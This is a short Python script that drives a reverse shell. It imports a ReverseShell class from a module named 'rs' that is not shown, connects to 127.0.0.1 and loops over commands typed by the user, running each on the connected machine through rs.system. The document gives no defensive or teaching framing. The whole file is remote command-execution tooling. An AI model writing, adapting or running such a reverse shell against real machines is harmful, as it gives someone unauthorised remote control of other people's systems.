from rs import ReverseShell

if __name__ == '__main__':
	# Creates a new reverse shell instance.
	with ReverseShell() as rs:
		# Connects to the given machine
		rs.connect('127.0.0.1')
		# Enters the command loop.
		while True:
			# Gets the command from the user.
			command = input('{}>'.format(rs.getcwd()))
			# If the command doesn't exist then we stop the loop.
			if not command: break
			# Sends a command to the given machine.
			rs.system(command)